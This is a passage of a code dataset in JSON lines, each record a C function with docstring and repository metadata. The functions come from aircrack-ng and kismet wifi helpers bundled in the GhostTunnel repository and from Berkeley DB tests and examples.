net_ifaces != NULL )\n        {\n            while (net_ifaces != NULL && ((this_iface = readdir(net_ifaces)) != NULL))\n            {\n                if (this_iface->d_name[0] == '.')\n                    continue;\n\n                char * new_r_file = (char *)realloc(r_file, (33 + strlen(this_iface->d_name) + 1) * sizeof(char));\n                if (!new_r_file) {\n                    continue;\n                }\n                r_file = new_r_file;\n                snprintf(r_file, 33 + strlen(this_iface->d_name) + 1,\n                    \"/sys/class/net/%s/device/rtap_iface\", this_iface->d_name);\n\n                if ((acpi = fopen(r_file, \"r\")) == NULL)\n                    continue;\n                if (acpi != NULL)\n                {\n                    dev->drivertype = DT_IPW2200;\n\n                    memset(buf, 0, 128);\n                    unused_str = fgets(buf, 128, acpi);\n                    if(n==0) //interface exists\n                    {\n                        if (strncmp(buf, iface, 5) == 0)\n                        {\n                            fclose(acpi);\n                            if (net_ifaces != NULL)\n                            {\n                                closedir(net_ifaces);\n                                net_ifaces = NULL;\n                            }\n                            dev->main_if = (char*) malloc(strlen(this_iface->d_name)+1);\n                            strcpy(dev->main_if, this_iface->d_name);\n                            break;\n                        }\n                    }\n                    else //need to create interface\n                    {\n                        if (strncmp(buf, \"-1\", 2) == 0)\n                        {\n                            //repoen for writing\n                            fclose(acpi);\n                            if ((acpi = fopen(r_file, \"w\")) == NULL)\n                                continue;\n                            fputs(\"1\", acpi);\n                            //reopen for reading\n                            fclose(acpi);\n                            if ((acpi = fopen(r_file, \"r\")) == NULL)\n                                continue;\n                            unused_str = fgets(buf, 128, acpi);\n                            if (strncmp(buf, iface, 5) == 0)\n                            {\n                                if (net_ifaces != NULL)\n                                {\n                                    closedir(net_ifaces);\n                                    net_ifaces = NULL;\n                                }\n                                dev->main_if = (char*) malloc(strlen(this_iface->d_name)+1);\n                                strcpy(dev->main_if, this_iface->d_name);\n                                fclose(acpi);\n                                break;\n                            }\n                        }\n                    }\n                    fclose(acpi);\n                }\n            }\n            if (net_ifaces != NULL)\n                closedir(net_ifaces);\n        }\n    }\n\n    if (openraw(dev, iface, dev->fd_out, &dev->arptype_out, dev->pl_mac) != 0) {\n        goto close_out;\n    }\n\n    /* don't use the same file descriptor for in and out on bcm43xx,\n       as you read from the interface, but write into a file in /sys/...\n     */\n    if(!(dev->drivertype == DT_BCM43XX) && !(dev->drivertype == DT_IPW2200)) {\n\t\tclose(dev->fd_in);\n        dev->fd_in = dev->fd_out;\n    } else {\n        /* if bcm43xx or ipw2200, swap both fds */\n        n=dev->fd_out;\n        dev->fd_out=dev->fd_in;\n        dev->fd_in=n;\n    }\n\n    dev->arptype_in = dev->arptype_out;\n\n    if(iface_malloced) free(iface);\n    if (r_file) {\n        free(r_file);\n    }\n    return 0;\nclose_out:\n    close(dev->fd_out);\n\tif (r_file) {\n\t\tfree(r_file);\n\t}\nclose_in:\n    close(dev->fd_in);\n    if(iface_malloced) free(iface);\n    if(iwpriv) free(iwpriv);\n    return 1;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\linux.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/**\n * Start reader thread\n * @return -1 if failed to start thread or 0 if it is successful\n */\n", "func_signal": "static int start_reader(struct tip_cygwin *priv)", "code": "{\n\tpriv->tc_running = 2;\n\tif (pthread_create(&priv->tc_reader, NULL, ti_reader, priv))\n\t\treturn -1;\n\n\tpriv->tc_running = 1;\n\n\treturn 0;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Find an interface, based on mode, that shares a parent with the provided\n * interface.\n *\n * Mode is typically LINUX_WL_MODE_MONITOR\n *\n * Returns the ifnum index, or 0\n */\n", "func_signal": "int find_interface_mode_by_parent(const char *base_ifname, int wlmode)", "code": "{\n    char *base_parent, *if_parent;\n    struct ifaddrs *ifaddr, *ifa;\n    char errstr[STATUS_MAX];\n    int r;\n\n\n    if ((base_parent = mac80211_find_parent(base_ifname)) == NULL)\n        return -1;\n\n    if (getifaddrs(&ifaddr) == -1)\n        return -1;\n\n    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {\n        if ((if_parent = mac80211_find_parent(ifa->ifa_name)) == NULL)\n            continue;\n\n        if (strcmp(if_parent, base_parent) == 0) {\n            int mode;\n\n            if (iwconfig_get_mode(ifa->ifa_name, errstr, &mode) >= 0) {\n                if (mode == wlmode) {\n                    r = if_nametoindex(ifa->ifa_name);\n                    free(if_parent);\n                    free(base_parent);\n                    freeifaddrs(ifaddr);\n                    return r;\n                }\n            }\n        }\n\n        free(if_parent);\n    }\n\n    freeifaddrs(ifaddr);\n    free(base_parent);\n\n    return -1;\n}", "path": "src\\libwifi\\kismet\\capture_linux_wifi\\capture_linux_wifi.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/**\n * Set device IP address\n * @param ip New IP address\n * @return -1 if it failed, 0 on success\n */\n", "func_signal": "static int ti_set_ip_cygwin(struct tif *ti, struct in_addr *ip)", "code": "{\n\tstruct tip_cygwin *priv = ti_priv(ti);\n\tULONG ctx, inst;\n\tIP_ADAPTER_INFO ai[16];\n\tDWORD len = sizeof(ai);\n\tPIP_ADAPTER_INFO p;\n\tPIP_ADDR_STRING ips;\n\n\tif (GetAdaptersInfo(ai, &len) != ERROR_SUCCESS)\n\t\treturn -1;\n\n\tp = ai;\n\twhile (p) {\n\t\tif (strcmp(priv->tc_guid, p->AdapterName) != 0) {\n\t\t\tp = p->Next;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* delete ips */\n\t\tips = &p->IpAddressList;\n\t\twhile (ips) {\n\t\t\tDeleteIPAddress(ips->Context);\n\t\t\tips = ips->Next;\n\t\t}\n\n\t\t/* add ip */\n\t\tif (AddIPAddress(ip->s_addr, htonl(0xffffff00),\n\t\t\t p->Index, &ctx, &inst) != NO_ERROR)\n\t\t\treturn -1;\n\n\t\tbreak;\n\t}\n\n\treturn 0;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* CRC checksum verification routine */\n", "func_signal": "int check_crc_buf_osdep( unsigned char *buf, int len )", "code": "{\n    unsigned long crc;\n\n    if (len<0)\n    \treturn 0;\n\n    crc = calc_crc_osdep(buf, len);\n    buf+=len;\n    return( ( ( crc       ) & 0xFF ) == buf[0] &&\n            ( ( crc >>  8 ) & 0xFF ) == buf[1] &&\n            ( ( crc >> 16 ) & 0xFF ) == buf[2] &&\n            ( ( crc >> 24 ) & 0xFF ) == buf[3] );\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\linux.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/**\n * Set device MAC address\n * @param mac New MAC address\n * @return -1 if it failed, 0 on success\n */\n", "func_signal": "static int ti_set_mac_cygwin(struct tif *ti, unsigned char *mac)", "code": "{\n\tstruct tip_cygwin *priv = ti_priv(ti);\n\tchar str[2*6+1];\n\tchar strold[sizeof(str)];\n\tint i;\n\tchar *key = \"MAC\";\n\n\t/* convert */\n\tstr[0] = 0;\n\tfor (i = 0; i < 6; i++) {\n\t\tchar tmp[3];\n\n\t\tif (sprintf(tmp, \"%.2X\", *mac++) != 2)\n\t\t\treturn -1;\n\t\tstrcat(str, tmp);\n\t}\n\n\t/* check if changed */\n\tif (ti_read_reg(priv, key, strold, sizeof(strold)) != -1) {\n\t\tif (strcmp(str, strold) == 0)\n\t\t\treturn 0;\n\t}\n\n\t/* own */\n\tif (RegSetValueEx(priv->tc_key, key, 0, REG_SZ, (unsigned char *)str,\n\t\t\t  strlen(str)+1) != ERROR_SUCCESS)\n\t\treturn -1;\n\n\tif (ti_reset(priv) == -1)\n\t\treturn -1;\n\n\treturn 0;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Channel control callback; actually set a channel.  Determines if our\n * custom channel needs a VHT frequency set. */\n", "func_signal": "int chancontrol_callback(kis_capture_handler_t *caph, uint32_t seqno, void *privchan,\n        char *msg)", "code": "{\n    local_wifi_t *local_wifi = (local_wifi_t *) caph->userdata;\n    local_channel_t *channel = (local_channel_t *) privchan;\n    int r;\n    char errstr[STATUS_MAX];\n    char chanstr[STATUS_MAX];\n\n    if (privchan == NULL) {\n        return 0;\n    }\n\n    if (!local_wifi->use_mac80211_channels) {\n        if ((r = iwconfig_set_channel(local_wifi->interface, \n                        channel->control_freq, errstr)) < 0) {\n            /* Sometimes tuning a channel fails; this is only a problem if we fail\n             * to tune a channel a bunch of times.  Spit out a tuning error at first;\n             * if we continually fail, if we have a seqno we're part of a CONFIGURE\n             * command and we send a configresp, otherwise send an error \n             *\n             * If seqno == 0 we're inside the chanhop, so we can tolerate failures.\n             * If we're sending an explicit channel change command, error out\n             * immediately.\n             *\n             * */\n            if (local_wifi->seq_channel_failure < 10 && seqno == 0) {\n                local_channel_to_str(channel, chanstr);\n                snprintf(msg, STATUS_MAX, \"Could not set channel %s; ignoring error \"\n                        \"and continuing (%s)\", chanstr, errstr);\n                cf_send_message(caph, msg, MSGFLAG_ERROR);\n                return 0;\n            } else {\n                local_channel_to_str(channel, chanstr);\n                snprintf(msg, STATUS_MAX, \"failed to set channel %s: %s\", \n                        chanstr, errstr);\n\n                if (seqno == 0) {\n                    cf_send_error(caph, 0, msg);\n                }\n\n                return -1;\n            }\n        } else {\n            local_wifi->seq_channel_failure = 0;\n\n            if (seqno != 0) {\n                /* Send a config response with a reconstituted channel if we're\n                 * configuring the interface; re-use errstr as a buffer */\n                local_channel_to_str(channel, errstr);\n                cf_send_configresp(caph, seqno, 1, NULL, errstr);\n            }\n        }\n\n        return 1;\n    } else {\n        /* Otherwise we're using mac80211 which means we need to figure out\n         * what kind of channel we're setting */\n        /* fprintf(stderr, \"debug - %s setting channel %d w %d\\n\", local_wifi->cap_interface, channel->control_freq, channel->chan_width); */\n\n        if (channel->chan_width != 0) {\n            /* An explicit channel width means we need to use _set_freq to set\n             * a control freq, a width, and possibly an extended center frequency\n             * for VHT; if center1 is 0 _set_frequency will automatically\n             * exclude it and only set the width */\n            r = mac80211_set_frequency_cache(local_wifi->mac80211_ifidx,\n                    local_wifi->mac80211_socket, local_wifi->mac80211_id,\n                    channel->control_freq, channel->chan_width,\n                    channel->center_freq1, channel->center_freq2, errstr);\n        } else {\n            /* Otherwise for HT40 and non-HT channels, set the channel w/ any\n             * flags present */\n            r = mac80211_set_channel_cache(local_wifi->mac80211_ifidx,\n                    local_wifi->mac80211_socket, local_wifi->mac80211_id,\n                    channel->control_freq, channel->chan_type, errstr);\n        } \n\n        /* Handle channel set results */\n        if (r < 0) {\n            /* If seqno == 0 we're inside the chanhop, so we can tolerate failures.\n             * If we're sending an explicit channel change command, error out\n             * immediately.\n             */\n            if (local_wifi->seq_channel_failure < 10 && seqno == 0) {\n                local_channel_to_str(channel, chanstr);\n                snprintf(msg, STATUS_MAX, \"Could not set channel %s; ignoring error \"\n                        \"and continuing (%s)\", chanstr, errstr);\n                cf_send_message(caph, msg, MSGFLAG_ERROR);\n                return 0;\n            } else {\n                local_channel_to_str(channel, chanstr);\n                snprintf(msg, STATUS_MAX, \"failed to set channel %s: %s\", \n                        chanstr, errstr);\n\n                if (seqno == 0) {\n                    cf_send_error(caph, 0, msg);\n                }\n\n                return -1;\n            }\n        } else {\n            local_wifi->seq_channel_failure = 0;\n            return 1;\n        }\n    }\n   \n    return 1;\n}", "path": "src\\libwifi\\kismet\\capture_linux_wifi\\capture_linux_wifi.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* End nl80211 */\n", "func_signal": "static int linux_get_channel(struct wif *wi)", "code": "{\n    struct priv_linux *dev = wi_priv(wi);\n    struct iwreq wrq;\n    int fd, frequency;\n    int chan=0;\n\n    memset( &wrq, 0, sizeof( struct iwreq ) );\n\n    if(dev->main_if)\n        strncpy( wrq.ifr_name, dev->main_if, IFNAMSIZ );\n    else\n        strncpy( wrq.ifr_name, wi_get_ifname(wi), IFNAMSIZ );\n    wrq.ifr_name[IFNAMSIZ-1] = 0;\n\n    fd = dev->fd_in;\n    if(dev->drivertype == DT_IPW2200)\n        fd = dev->fd_main;\n\n    if( ioctl( fd, SIOCGIWFREQ, &wrq ) < 0 )\n        return( -1 );\n\n    frequency = wrq.u.freq.m;\n    if (frequency > 100000000)\n        frequency/=100000;\n    else if (frequency > 1000000)\n        frequency/=1000;\n\n    if (frequency > 1000)\n        chan = getChannelFromFrequency(frequency);\n    else chan = frequency;\n\n    return chan;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\linux.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/*\n * tm_mutex_destroy --\n *\tDestroy the mutexes.\n */\n", "func_signal": "void\ntm_mutex_destroy()", "code": "{\n\tTM *gp, *mp;\n\tu_int i;\n\tint err;\n\n\tif (verbose)\n\t\tprintf(\"Destroy the global mutex.\\n\");\n\tgp = (TM *)gm_addr;\n\tif ((err = dbenv->mutex_free(dbenv, gp->mutex)) != 0) {\n\t\tfprintf(stderr, \"%s: DB_ENV->mutex_free (global): %s\\n\",\n\t\t    progname, db_strerror(err));\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (verbose)\n\t\tprintf(\"Destroy the per-thread mutexes.\\n\");\n\tfor (i = 0; i < nthreads * nprocs; ++i) {\n\t\tmp = (TM *)(tm_addr + i * sizeof(TM));\n\t\tif ((err = dbenv->mutex_free(dbenv, mp->mutex)) != 0) {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: DB_ENV->mutex_free (per-thread %d): %s\\n\",\n\t\t\t    progname, i, db_strerror(err));\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t}\n\n\tif (verbose)\n\t\tprintf(\"Destroy the per-lock mutexes.\\n\");\n\tfor (i = 0; i < maxlocks; ++i) {\n\t\tmp = (TM *)(lm_addr + i * sizeof(TM));\n\t\tif ((err = dbenv->mutex_free(dbenv, mp->mutex)) != 0) {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: DB_ENV->mutex_free (per-lock: %d): %s\\n\",\n\t\t\t    progname, i, db_strerror(err));\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t}\n}", "path": "src\\mutex\\test_mutex.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * tm_env_init --\n *\tCreate the backing database environment.\n */\n", "func_signal": "int\ntm_env_init()", "code": "{\n\tu_int32_t flags;\n\tint ret;\n\tchar *home;\n\n\t/*\n\t * Create an environment object and initialize it for error\n\t * reporting.\n\t */\n\tif ((ret = db_env_create(&dbenv, 0)) != 0) {\n\t\tfprintf(stderr, \"%s: %s\\n\", progname, db_strerror(ret));\n\t\treturn (1);\n\t}\n\tenv = dbenv->env;\n\tdbenv->set_errfile(dbenv, stderr);\n\tdbenv->set_errpfx(dbenv, progname);\n\n\t/* Allocate enough mutexes. */\n\tif ((ret = dbenv->mutex_set_increment(dbenv,\n\t    1 + nthreads * nprocs + maxlocks)) != 0) {\n\t\tdbenv->err(dbenv, ret, \"dbenv->mutex_set_increment\");\n\t\treturn (1);\n\t}\n\n\tflags = DB_CREATE;\n\tif (nprocs == 1) {\n\t\thome = NULL;\n\t\tflags |= DB_PRIVATE;\n\t} else\n\t\thome = TESTDIR;\n\tif (nthreads != 1)\n\t\tflags |= DB_THREAD;\n\tif ((ret = dbenv->open(dbenv, home, flags, 0)) != 0) {\n\t\tdbenv->err(dbenv, ret, \"environment open: %s\", home);\n\t\treturn (1);\n\t}\n\n\treturn (0);\n}", "path": "src\\mutex\\test_mutex.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/* Called once when the server is started. Creates and opens 2 databases. */\n", "func_signal": "int\ntpsvrinit(int argc, char* argv[])", "code": "{\n\tprogname = argv[0];\n\treturn (init_xa_server(NUMDB, progname, 0));\n}", "path": "test\\xa\\src3\\server.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * Create the threads to call the servers, and check that data in the two\n * databases is identical.\n */\n", "func_signal": "int\nmain(int argc, char* argv[])", "code": "{\n\tint ch, i, ret, ttype;\n\tpthread_t threads[NUM_THREADS];\n\tstruct thread_args args[NUM_THREADS];\n\tvoid *results = NULL;\n\tchar *names[] = {\"1\", \"2\"};\n\n\tprogname = argv[0];\n\ti = 1;\n\tverbose = 0;\n\n\twhile ((ch = getopt(argc, argv, \"vt\")) != EOF) {\n\t\tswitch (ch) {\n\t\tcase 't':\n\t\t\tttype = atoi(argv[++i]);\n\t\t\tbreak;\n\t\tcase 'v':\n\t\t\tverbose = 1;\n\t\t\tbreak;\n\t\tcase '?':\n\t\tdefault:\n\t\t\treturn (usage());\n\t\t}\n\t\ti++;\n\t}\n\targc -= optind;\n\targv += optind;\n\n\tif (ttype > 2 || ttype < 0)\n\t\treturn (usage());\n\n\tif (verbose)\n\t\tprintf(\"%s: called with type %i\\n\", progname, ttype);\n\n\tfor(i = 0; i < (NUM_TESTS*3); i++) {\n\t\tpthread_cond_init(&cond_vars[i], NULL);\n\t\tcounters[i] = 0;\n\t}\n\n\t/* Create threads for different contexts*/\n\tfor (i = 0; i < NUM_THREADS; i++) {\n\t\targs[i].thread_name = names[i];\n\t\targs[i].type_test = ttype;\n\t\tif (verbose)\n\t\t\tprintf(\"calling server thread\\n\");\n\t\tif ((ret = pthread_create(&threads[i], NULL, \n\t\t    call_server_thread, &(args[i]))) != 0) {\n\t\t\tfprintf(stderr, \"%s: failed to create thread %s.\\n\",\n\t\t\t    progname, ret);\n\t\t\tgoto err;\n\t\t}\n\t}\n\n\t/* Wait for each thread to finish. */\n\tfor (i = 0; i < NUM_THREADS; i++) {\n\t\tif ((ret = pthread_join(threads[i], &results)) != 0) {\n\t\t\tfprintf(stderr, \"%s: failed to join thread %s.\\n\",\n\t\t\t    progname, ret);\n\t\t\tgoto err;\n\t\t}\n\t\tif (results != NULL)\n\t\t\tgoto err; \n\t}\t\n\n\tif (0) {\nerr:\t\tret = EXIT_FAILURE;\n\t}\n\n\tfor(i = 0; i < (NUM_TESTS*2); i++)\n\t\tpthread_cond_destroy(&cond_vars[i]);\n\n\treturn (ret);\n}", "path": "test\\xa\\src5\\client.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * tm_mutex_init --\n *\tInitialize the mutexes.\n */\n", "func_signal": "void\ntm_mutex_init()", "code": "{\n\tTM *mp;\n\tu_int i;\n\tint err;\n\n\tif (verbose)\n\t\tprintf(\"Allocate the global mutex: \");\n\tmp = (TM *)gm_addr;\n\tif ((err = dbenv->mutex_alloc(dbenv, 0, &mp->mutex)) != 0) {\n\t\tfprintf(stderr, \"%s: DB_ENV->mutex_alloc (global): %s\\n\",\n\t\t    progname, db_strerror(err));\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (verbose)\n\t\tprintf(\"%lu\\n\", (u_long)mp->mutex);\n\n\tif (verbose)\n\t\tprintf(\n\t\t    \"Allocate %d per-thread, self-blocking mutexes: \",\n\t\t    nthreads * nprocs);\n\tfor (i = 0; i < nthreads * nprocs; ++i) {\n\t\tmp = (TM *)(tm_addr + i * sizeof(TM));\n\t\tif ((err = dbenv->mutex_alloc(\n\t\t    dbenv, DB_MUTEX_SELF_BLOCK, &mp->mutex)) != 0) {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: DB_ENV->mutex_alloc (per-thread %d): %s\\n\",\n\t\t\t    progname, i, db_strerror(err));\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t\tif ((err = dbenv->mutex_lock(dbenv, mp->mutex)) != 0) {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: DB_ENV->mutex_lock (per-thread %d): %s\\n\",\n\t\t\t    progname, i, db_strerror(err));\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t\tif (verbose)\n\t\t\tprintf(\"%lu \", (u_long)mp->mutex);\n\t}\n\tif (verbose)\n\t\tprintf(\"\\n\");\n\n\tif (verbose)\n\t\tprintf(\"Allocate %d per-lock mutexes: \", maxlocks);\n\tfor (i = 0; i < maxlocks; ++i) {\n\t\tmp = (TM *)(lm_addr + i * sizeof(TM));\n\t\tif ((err = dbenv->mutex_alloc(dbenv, 0, &mp->mutex)) != 0) {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: DB_ENV->mutex_alloc (per-lock: %d): %s\\n\",\n\t\t\t    progname, i, db_strerror(err));\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t\tif (verbose)\n\t\t\tprintf(\"%lu \", (u_long)mp->mutex);\n\t}\n\tif (verbose)\n\t\tprintf(\"\\n\");\n}", "path": "src\\mutex\\test_mutex.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * field_cmp_double --\n *\tCompare two double.\n */\n", "func_signal": "int\nfield_cmp_double(void *a, void *b, OPERATOR op)", "code": "{\n\tswitch (op) {\n\tcase GT:\n\t\treturn (*(double *)a > *(double *)b);\n\tcase GTEQ:\n\t\treturn (*(double *)a >= *(double *)b);\n\tcase LT:\n\t\treturn (*(double *)a < *(double *)b);\n\tcase LTEQ:\n\t\treturn (*(double *)a <= *(double *)b);\n\tcase NEQ:\n\t\treturn (*(double *)a != *(double *)b);\n\tcase EQ:\n\t\treturn (*(double *)a == *(double *)b);\n\tcase WC:\n\tcase NWC:\n\t\tbreak;\n\t}\n\n\tabort();\n\t/* NOTREACHED */\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n *\t    Operation\t\t    Success\n * Thread 1\tThread 2\tno MVCC\t\tMVCC\n * write    \twrite\t\tno\t\tno\n * write    \tread\t\tno\t\tyes\n * read\t\tread\t\tyes\t\tyes\n * read\t\twrite\t\tno\t\tyes\n */\n", "func_signal": "void init_tests(char *ops[], int success[], int type, int thread_num)", "code": "{\n\tif (thread_num == 1) {\n\t\tops[0] = wdb1;\n\t\tops[1] = wdb1;\n\t\tops[2] = rdb1;\n\t\tops[3] = rdb1;\n\t\t/* Thread 1 is always successful. */\n\t\tsuccess[0] = 1;\n\t\tsuccess[1] = 1;\n\t\tsuccess[2] = 1;\n\t\tsuccess[3] = 1;\n\t} else {\n\t\tops[0] = wdb1;\n\t\tops[1] = rdb1;\n\t\tops[2] = rdb1;\n\t\tops[3] = wdb1;\n\t\tif (type == NO_MVCC) {\n\t\t\tsuccess[0] = 0;\n\t\t\tsuccess[1] = 0;\n\t\t\tsuccess[2] = 1;\n\t\t\tsuccess[3] = 0;\n\t\t} else {\n\t\t\tsuccess[0] = 0;\n\t\t\tsuccess[1] = 1;\n\t\t\tsuccess[2] = 1;\n\t\t\tsuccess[3] = 1;\n\t\t}\n\t}\n}", "path": "test\\xa\\src5\\client.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * strtod_err --\n *\tstrtod(3) with error checking.\n */\n", "func_signal": "int\nstrtod_err(char *input, double *valp)", "code": "{\n\tdouble val;\n\tchar *end;\n\n\t/*\n\t * strtoul requires setting errno to detect errors.\n\t */\n\terrno = 0;\n\tval = strtod(input, &end);\n\tif (errno == ERANGE) {\n\t\tdbenv->err(dbenv, ERANGE, \"%s\", input);\n\t\treturn (1);\n\t}\n\tif (input[0] == '\\0' ||\n\t    (end[0] != '\\0' && end[0] != '\\n' && !isspace(end[0]))) {\n\t\tdbenv->errx(dbenv,\n\t\t    \"%s: invalid floating point argument\", input);\n\t\treturn (1);\n\t}\n\n\t*valp = val;\n\treturn (0);\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * compare_ulong --\n *\tCompare two keys.\n */\n", "func_signal": "int\ncompare_ulong(DB *db_arg, const DBT *a_arg, const DBT *b_arg)", "code": "{\n\tu_long a, b;\n\n\tdb_arg = db_arg;\t\t\t/* Quiet compiler. */\n\n\tmemcpy(&a, a_arg->data, sizeof(u_long));\n\tmemcpy(&b, b_arg->data, sizeof(u_long));\n\treturn (a > b ? 1 : ((a < b) ? -1 : 0));\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * __os_isroot --\n *\tReturn if user has special permissions.\n *\n * PUBLIC: int __os_isroot __P((void));\n */\n", "func_signal": "int\n__os_isroot()", "code": "{\n#ifdef HAVE_GETUID\n\treturn (getuid() == 0);\n#else\n\treturn (0);\n#endif\n}", "path": "src\\os\\os_root.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * field_cmp_ulong --\n *\tCompare two ulongs.\n */\n", "func_signal": "int\nfield_cmp_ulong(void *a, void *b, OPERATOR op)", "code": "{\n\tswitch (op) {\n\tcase GT:\n\t\treturn (*(u_long *)a > *(u_long *)b);\n\tcase GTEQ:\n\t\treturn (*(u_long *)a >= *(u_long *)b);\n\tcase LT:\n\t\treturn (*(u_long *)a < *(u_long *)b);\n\tcase LTEQ:\n\t\treturn (*(u_long *)a <= *(u_long *)b);\n\tcase NEQ:\n\t\treturn (*(u_long *)a != *(u_long *)b);\n\tcase EQ:\n\t\treturn (*(u_long *)a == *(u_long *)b);\n\tcase WC:\n\tcase NWC:\n\t\tbreak;\n\t}\n\n\tabort();\n\t/* NOTREACHED */\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * PUBLIC: void _debug_check  __P((void));\n */\n", "func_signal": "void\n_debug_check()", "code": "{\n\tif (__debug_on == 0)\n\t\treturn;\n\n\tif (__debug_print != 0) {\n\t\tprintf(\"\\r%7d:\", __debug_on);\n\t\t(void)fflush(stdout);\n\t}\n\tif (__debug_on++ == __debug_test || __debug_stop)\n\t\t__db_loadme();\n}", "path": "lang\\tcl\\tcl_internal.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * strchr --\n *\n * PUBLIC: #ifndef HAVE_STRCHR\n * PUBLIC: char *strchr __P((const char *,  int));\n * PUBLIC: #endif\n */\n", "func_signal": "char *strchr(const char *p, int ch)", "code": "{\n\tchar c;\n\n\tc = ch;\n\tfor (;; ++p) {\n\t\tif (*p == c)\n\t\t\treturn ((char *)p);\n\t\tif (*p == '\\0')\n\t\t\treturn (NULL);\n\t}\n\t/* NOTREACHED */\n}", "path": "src\\clib\\strchr.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * entry_print --\n *\tDisplay the primary database's data item.\n */\n", "func_signal": "int\nentry_print(void *data, size_t len, u_int32_t field_count)", "code": "{\n\tu_int32_t a, *offset;\n\tu_int i;\n\tchar *raw;\n\n\tmemcpy(&a, data, sizeof(u_int32_t));\n\tprintf(\"\\tversion: %lu\\n\", (u_long)a);\n\n\toffset = (u_int32_t *)data + 1;\n\tif (field_count == 0) {\n\t\tmemcpy(&a, offset++, sizeof(u_int32_t));\n\t\tprintf(\"\\tcolumn map: %lu fields: {%.*s}\\n\", (u_long)a,\n\t\t    (int)(len - 2 * sizeof(u_int32_t)),\n\t\t    (u_int8_t *)data + 2 * sizeof(u_int32_t));\n\t} else {\n\t\traw = (char *)(offset + (field_count + 1));\n\t\tfor (i = 0; i < field_count; ++i) {\n\t\t\tmemcpy(&a, &offset[i], sizeof(u_int32_t));\n\t\t\tlen = OFFSET_LEN(offset, i);\n\t\t\tprintf(\"\\toffset %4lu: len %4lu: {%.*s}\\n\",\n\t\t\t    (u_long)offset[i],\n\t\t\t    (u_long)len, (int)len, raw + a);\n\t\t}\n\t}\n\n\treturn (0);\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * field_cmp_string --\n *\tCompare two strings.\n */\n", "func_signal": "int\nfield_cmp_string(void *a, void *b, OPERATOR op)", "code": "{\n\tint v;\n\n\tv = strcasecmp(*(char **)a, b);\n\tswitch (op) {\n\tcase GT:\n\t\treturn (v > 0 ? 1 : 0);\n\tcase GTEQ:\n\t\treturn (v >= 0 ? 1 : 0);\n\tcase LT:\n\t\treturn (v < 0 ? 1 : 0);\n\tcase LTEQ:\n\t\treturn (v <= 0 ? 1 : 0);\n\tcase NEQ:\n\t\treturn (v ? 1 : 0);\n\tcase EQ:\n\t\treturn (v ? 0 : 1);\n\tcase WC:\n\tcase NWC:\n\t\tbreak;\n\t}\n\n\tabort();\n\t/* NOTREACHED */\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
